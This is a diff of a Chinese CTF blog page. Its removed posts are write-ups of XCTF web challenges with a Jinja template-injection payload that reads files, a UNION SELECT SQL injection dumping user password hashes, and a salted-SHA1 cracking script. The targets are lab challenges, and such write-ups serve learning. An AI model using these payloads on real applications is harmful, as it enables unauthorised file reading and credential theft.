@@ -108,150 +108,42 @@
     
     
     <article
-  id="post-Confusion1"
+  id="post-2_insanity"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
   data-scroll-reveal
 >
   <div class="article-inner">
-     
-    <div class="article-meta">
-      <a href="/2021/11/15/Confusion1/" class="article-date">
-  <time datetime="2021-11-15T09:41:28.158Z" itemprop="datePublished">2021-11-15</time>
-</a>    
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
+    
+    <header class="article-header">
        
-  <p>访问 <a target="_blank" rel="noopener" href="http://111.200.241.244:62141/login.php">http://111.200.241.244:62141/login.php</a></p>
-<p>以及 <a target="_blank" rel="noopener" href="http://111.200.241.244:62141/register.php">http://111.200.241.244:62141/register.php</a></p>
-<p>发现源代码上有hint</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--Salt @ /opt/salt_b420e8cfb8862548e68459ae1d37a1d5.txt--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--Flag @ /opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt--&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>访问其他页面 没有什么明显的漏洞 </p>
-<p>看图片 是蛇缠绕了大象 想到python和php</p>
-<p>目前python想到就是flask模板注入</p>
-<p>试试看</p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwfxjhrqjhj318r09njvi.jpg" alt="image.png"></p>
-<p>存在模板注入</p>
-<p>有waf</p>
-<p>payload </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[request.args.a][request.args.b][2][request.args.c]()[40](&#x27;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#x27;)[request.args.d]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read</span><br></pre></td></tr></table></figure> 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-    </footer>
-  </div>
-
-    
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/05/26/2_insanity/"
+    >2_insanity</a> 
+</h2>
  
-    
-</article>
 
-    
-    <article
-  id="post-FlatScience"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
+      
+    </header>
      
     <div class="article-meta">
-      <a href="/2021/11/15/FlatScience/" class="article-date">
-  <time datetime="2021-11-15T09:41:28.157Z" itemprop="datePublished">2021-11-15</time>
-</a>    
+      <a href="/2019/05/26/2_insanity/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91/">逆向</a> / <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">攻防世界</a>
+  </div>
+   
     </div>
       
     <div class="article-entry" itemprop="articleBody">
        
-  <p>dirseach 扫 有爬虫文件    发现隐藏文件 </p>
-<p>访问</p>
-<p>/login.php</p>
-<p>F12 有注释</p>
-<p>进入/login.php?debug</p>
-<p>代码审计 </p>
-<p>sqlmap扫</p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwc809d4ybj30yo013t9i.jpg" alt="ima1e.png"></p>
-<p>根据自己样子改</p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwc81lnmplj31ae079dn7.jpg" alt="image.png"></p>
-<p> SQLite_masterdb</p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwc837ravej30r8089441.jpg" alt="image.png"></p>
-<p>sql注入</p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwc8o5364aj30yq0daq89.jpg" alt="image.png"></p>
-<p>没报错 </p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwc8omzwmjj30yo0ckafh.jpg" alt="image.png"></p>
-<p>报错</p>
-<p>字段数为2</p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwc8qx7u0bj30z00eiwmr.jpg" alt="image.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=+CREATE+TABLE+Users%28id+int+primary+key%2Cname+varchar%28255%29%2Cpassword+varchar%28255%29%2Chint+varchar%28255%29%29; expires=Fri, 12-Nov-2021 04:11:59 GMT; Max-Age=60; path=/</span><br></pre></td></tr></table></figure>
-
-
-
-<p>url 解码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE+TABLE+Users(id+int+primary+key,name+varchar(255),password+varchar(255),hint+varchar(255)); expires=Fri, 12-Nov-2021 04:11:59 GMT; Max-Age=60; path=/</span><br></pre></td></tr></table></figure>
-
-
-
-<p>整理</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Users</span><br><span class="line">(</span><br><span class="line">    id       int primary key,</span><br><span class="line">    name     varchar(255),</span><br><span class="line">    password varchar(255),</span><br><span class="line">    hint     varchar(255)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
-
-
-
-<p>和之前sqlmap爬出来的一样</p>
-<p>然后</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pw=&amp;usr=1&#x27;union select 1,group_concat(name,password) from Users--+</span><br></pre></td></tr></table></figure>
-
-<p>结果</p>
-<p>admin54eae8935c90f467427f05e4ece82cf569f89507fritze34b0bb7c304949f9ff2fc101eef0f048be10d3bdhansi</p>
-<p>所以 admin 的密码哈希是 </p>
-<p>54eae8935c90f467427f05e4ece82cf569f89507</p>
-<p>查询下hint</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: name=+my+fav+word+in+my+fav+paper%3F%21; expires=Fri, 12-Nov-2021 04:18:01 GMT; Max-Age=60; path=/</span><br></pre></td></tr></table></figure>
-
-<p>然后代码审计</p>
-<p>.sha1($pass.”Salz!”)</p>
-<p>这个的意思是 密码加盐后在进行 sha1 运算  sha1 是md5加强升级版</p>
-<p>所以逻辑就是 </p>
-<p>sha1($pass.”Salz!”)==54eae8935c90f467427f05e4ece82cf569f89507</p>
-<p>偷个懒 cmd5   <a target="_blank" rel="noopener" href="https://www.cmd5.com/">https://www.cmd5.com/</a></p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwc9bqzaqmj31110cfq5q.jpg" alt="image.png"></p>
-<p>穷人流下了眼泪</p>
-<p>爷自己爆破</p>
-<p>提示</p>
-<p>我最爱的单词在我最爱的文章中</p>
-<p>康康文章</p>
-<p>密码应该是文章里的一个单词</p>
-<p>先下载下来</p>
-<p>自己写一个全站pdf爬虫 思路是先搞一个函数 负责扫描全站 </p>
-<p>在搞一个递归函数找子页面 负责的调用扫描函数 ，全站找pdf文件</p>
-<p><strong>理论可行 实践开始</strong></p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwcebnvv63j31m1076wmz.jpg" alt="image.png"></p>
-<p>这题目暗算我 卧槽  我说写了怎么就都是死循环</p>
-<p>害我的浪费好多实践</p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwceikbf1cj30vi0getfu.jpg" alt="image.png"></p>
-<p>这是payload</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> wget</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_pdf</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="comment"># if re.match(&#x27;.*/index.html/*&#x27;, url):</span></span><br><span class="line">    <span class="comment">#     url = url.replace(&#x27;index.html/&#x27;,&#x27;&#x27;)</span></span><br><span class="line">    <span class="comment"># if re.match(&#x27;.*/../.*&#x27;, url):</span></span><br><span class="line">    <span class="comment">#     url = url.replace(&#x27;../&#x27;,&#x27;&#x27;)</span></span><br><span class="line">    <span class="built_in">list</span> = []  <span class="comment"># 作为保存下载链接的列表</span></span><br><span class="line">    <span class="comment"># burp0_url = &quot;http://111.200.241.244:51285/&quot;</span></span><br><span class="line">    burp0_url = url</span><br><span class="line">    <span class="keyword">if</span>  re.match(<span class="string">&#x27;.*pdf&#x27;</span>, url):</span><br><span class="line">        <span class="comment"># print(list)</span></span><br><span class="line">            <span class="comment">#为了递归做准备</span></span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># url = url.replace(&#x27;index.html/&#x27;,&#x27;&#x27;) + &#x27;/&#x27;</span></span><br><span class="line">        burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;42vk7uq3siu00c&quot;</span></span><br><span class="line">                                      <span class="string">&quot;svncvn1cr3o4&quot;</span>, <span class="string">&quot;td_cookie&quot;</span>: <span class="string">&quot;298269563&quot;</span>&#125;</span><br><span class="line">        burp0_headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;If-None-Match&quot;</span>: <span class="string">&quot;\&quot;3ff-575a2df88f5c0-gzip\&quot;&quot;</span>,</span><br><span class="line">                         <span class="string">&quot;If-Modified-Since&quot;</span>: <span class="string">&quot;Wed, 12 Sep 2018 01:54:39 GMT&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">        html=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)</span><br><span class="line">        html=html.text</span><br><span class="line">        <span class="comment"># print(html)</span></span><br><span class="line">        content=etree.HTML(html)</span><br><span class="line">        <span class="comment"># print(content)</span></span><br><span class="line">        result = content.xpath(<span class="string">&#x27;//body/a&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(result)</span></span><br><span class="line">        <span class="comment"># print(&quot;================&quot;)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> result:</span><br><span class="line">            <span class="comment"># print(each)</span></span><br><span class="line">            <span class="comment"># print(each.attrib[&#x27;href&#x27;])  #解析文件的下载链接</span></span><br><span class="line">            temp=each.attrib[<span class="string">&#x27;href&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> re.match(<span class="string">&#x27;.*/index.html/&#x27;</span>, url + <span class="string">&#x27;/&#x27;</span> + temp):</span><br><span class="line">                url = url.replace(<span class="string">&#x27;/index.html/&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                url = url.replace(<span class="string">&#x27;/index.html&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                <span class="comment"># print(&quot;=========&quot;,url)</span></span><br><span class="line">            <span class="keyword">if</span> re.match(<span class="string">&#x27;.*../index&#x27;</span>, temp):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> re.match(<span class="string">&#x27;.*.html&#x27;</span>, url+<span class="string">&#x27;/&#x27;</span>+temp):</span><br><span class="line">                <span class="built_in">print</span>(url+<span class="string">&#x27;/&#x27;</span>+temp)</span><br><span class="line">                <span class="comment"># if re.match(&#x27;.*/index.html/.*&#x27;, url + &#x27;/&#x27; + temp):</span></span><br><span class="line">                <span class="comment">#     scan_pdf(url.replace(&#x27;/index.html/&#x27;, &#x27;&#x27;) + &#x27;/&#x27; + temp)  # 用递归找子页面里面的pdf文件</span></span><br><span class="line">                <span class="keyword">if</span> re.match(<span class="string">&#x27;.*index.html/&#x27;</span>, url+<span class="string">&#x27;/&#x27;</span>+temp):  <span class="comment">#防止出现类似http://111.200.241.244:51285//1/index.html/3/index.html的东西</span></span><br><span class="line">                    <span class="comment"># print(&quot;==========================&quot;+url.replace(&#x27;index.html/&#x27;,&#x27;&#x27;) + &#x27;/&#x27; + temp)</span></span><br><span class="line">                    scan_pdf(url.replace(<span class="string">&#x27;index.html/&#x27;</span>,<span class="string">&#x27;&#x27;</span>) + <span class="string">&#x27;/&#x27;</span> + temp)  <span class="comment"># 用递归找子页面里面的pdf文件</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    scan_pdf(url+<span class="string">&#x27;/&#x27;</span>+each.attrib[<span class="string">&#x27;href&#x27;</span>])  <span class="comment"># 用递归找子页面里面的pdf文件</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                    <span class="comment"># break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># print()</span></span><br><span class="line">                <span class="comment"># print()</span></span><br><span class="line">                wget.download(url+<span class="string">&#x27;/&#x27;</span>+each.attrib[<span class="string">&#x27;href&#x27;</span>])</span><br><span class="line">                <span class="built_in">list</span>.append(each.attrib[<span class="string">&#x27;href&#x27;</span>])</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">list</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def scan_html(url):</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    a= <span class="string">&quot;http://111.200.241.244:50932&quot;</span>  <span class="comment"># 在此处更改payload</span></span><br><span class="line">    <span class="comment"># list_result=[]</span></span><br><span class="line">    scan_pdf(a)</span><br><span class="line">    <span class="comment"># print(list_result)</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
-
-<p>贴个大佬的爬虫payload（小改了一下，有些bug）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import wget</span><br><span class="line"></span><br><span class="line">re1 = &#x27;[a-fA-F0-9]&#123;32,32&#125;.pdf&#x27;</span><br><span class="line">re2 = &#x27;[0-9\/]&#123;2,2&#125;index.html&#x27;</span><br><span class="line"></span><br><span class="line">pdf_list = []</span><br><span class="line">def get_pdf(url):</span><br><span class="line">    global pdf_list </span><br><span class="line">    print(url)</span><br><span class="line">    req = requests.get(url).text</span><br><span class="line">    re_1 = re.findall(re1,req)</span><br><span class="line">    for i in re_1:</span><br><span class="line">        pdf_url = url+i</span><br><span class="line">        # print(pdf_url)</span><br><span class="line">        pdf_list.append(pdf_url)</span><br><span class="line">    re_2 = re.findall(re2,req)</span><br><span class="line">    for j in re_2:</span><br><span class="line">        new_url = url+j[0:2]</span><br><span class="line">        get_pdf(new_url)</span><br><span class="line">    return pdf_list</span><br><span class="line"></span><br><span class="line">pdf_list = get_pdf(&#x27;http://111.200.241.244:50932/&#x27;)</span><br><span class="line">for i in pdf_list:</span><br><span class="line">    wget.download(i)</span><br></pre></td></tr></table></figure>
-
-<p>优美的代码 羡慕了</p>
-<p>解析pdf找单词的偷个懒 </p>
-<p>贴个R3col大佬的</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pdfminer.pdfparser <span class="keyword">import</span> PDFParser</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfdocument <span class="keyword">import</span> PDFDocument</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfpage <span class="keyword">import</span> PDFPage</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFResourceManager, PDFPageInterpreter</span><br><span class="line"><span class="keyword">from</span> pdfminer.converter <span class="keyword">import</span> PDFPageAggregator</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> LTTextBoxHorizontal, LAParams</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pdf_2_txt</span>(<span class="params">start, end</span>):</span></span><br><span class="line">    pdf_filename = start</span><br><span class="line">    txt_filename = end</span><br><span class="line">    <span class="comment"># 不显示warning</span></span><br><span class="line">    logging.propagate = <span class="literal">False</span></span><br><span class="line">    logging.getLogger().setLevel(logging.ERROR)</span><br><span class="line">    device = PDFPageAggregator(PDFResourceManager(), laparams=LAParams())</span><br><span class="line">    interpreter = PDFPageInterpreter(PDFResourceManager(), device)</span><br><span class="line">    parser = PDFParser(<span class="built_in">open</span>(pdf_filename, <span class="string">&#x27;rb&#x27;</span>))</span><br><span class="line">    doc = PDFDocument(parser)</span><br><span class="line">    parser.set_document(doc)</span><br><span class="line">    <span class="comment"># 检测文档是否提供txt转换，不提供就忽略</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> doc.is_extractable:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(txt_filename, <span class="string">&#x27;w+&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> fw:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;num page:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(<span class="built_in">list</span>(PDFPage.create_pages(doc)))))</span><br><span class="line">            <span class="keyword">for</span> page <span class="keyword">in</span> PDFPage.create_pages(doc):</span><br><span class="line">                interpreter.process_page(page)</span><br><span class="line">                layout = device.get_result()</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> layout:</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">isinstance</span>(x, LTTextBoxHorizontal):</span><br><span class="line">                        results = x.get_text()</span><br><span class="line">                        fw.write(results)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pwd</span>():</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">31</span>):</span><br><span class="line">        f = <span class="built_in">open</span>(filePath + <span class="string">&#x27;\\txt\\&#x27;</span> + <span class="built_in">str</span>(a) + <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>).read()</span><br><span class="line">        wordlist = re.split(<span class="string">&quot; |\n&quot;</span>, f)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> wordlist:</span><br><span class="line">            y = s + <span class="string">&quot;Salz!&quot;</span></span><br><span class="line">            encode = hashlib.sha1(y.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> encode == <span class="string">&quot;3fab54a50e770d830c0416df817567662a9dc85c&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;password is :&quot;</span> + s)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    filePath = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 绝对路径</span></span><br><span class="line">    lists = os.listdir(filePath)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">31</span>):</span><br><span class="line">        x = filePath + <span class="string">&#x27;\\&#x27;</span> + lists[i - <span class="number">1</span>]</span><br><span class="line">        pdf_2_txt(x, filePath + <span class="string">&#x27;\\txt\\&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;.txt&#x27;</span>)  <span class="comment"># 在目录下创建一个txt文件夹</span></span><br></pre></td></tr></table></figure>
-
-<p>哎 我好菜</p>
-<p>ThinJerboa 是 密码</p>
-<p>flag{Th3_Fl4t_Earth_Prof_i$_n0T_so_Smart_huh?}</p>
+  <h1 id="2-insanity"><a href="#2-insanity" class="headerlink" title="2_insanity"></a>2_insanity</h1><p>丢ida 找到main函数 F5大法</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwa6c4azsvj30jz06ntam.jpg" alt="image.png"></p>
+<p>很明显 追踪&amp;strs</p>
+<p><img src="C:\Users\jw5t\AppData\Roaming\Typora\typora-user-images\image-20211110171836918.png" alt="image-20211110171836918"></p>
+<p>flag</p>
  
       <!-- reward -->
       
@@ -272,33 +164,53 @@
 
     
     <article
-  id="post-ics-07"
+  id="post-1_Hello, CTF"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
   data-scroll-reveal
 >
   <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/05/26/1_Hello,%20CTF/"
+    >1_Hello, CTF</a> 
+</h2>
+ 
+
+      
+    </header>
      
     <div class="article-meta">
-      <a href="/2021/11/15/ics-07/" class="article-date">
-  <time datetime="2021-11-15T09:41:28.155Z" itemprop="datePublished">2021-11-15</time>
-</a>    
+      <a href="/2019/05/26/1_Hello,%20CTF/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91/">逆向</a> / <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">攻防世界</a>
+  </div>
+   
     </div>
       
     <div class="article-entry" itemprop="articleBody">
        
-  <p>进入后发现项目管理里面有子页面</p>
-<p>里面可以直接查看源代码   已经给出注释</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;cetc7&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[page])) &#123;</span><br><span class="line">      show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">      <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[page]) &amp;&amp; <span class="variable">$_GET</span>[page] != <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">      header(<span class="string">&#x27;Location: ?page=flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">		<span class="comment">//这段就是无论如何都定向到flag.php</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;form action=<span class="string">&quot;#&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">      page : &lt;input type=<span 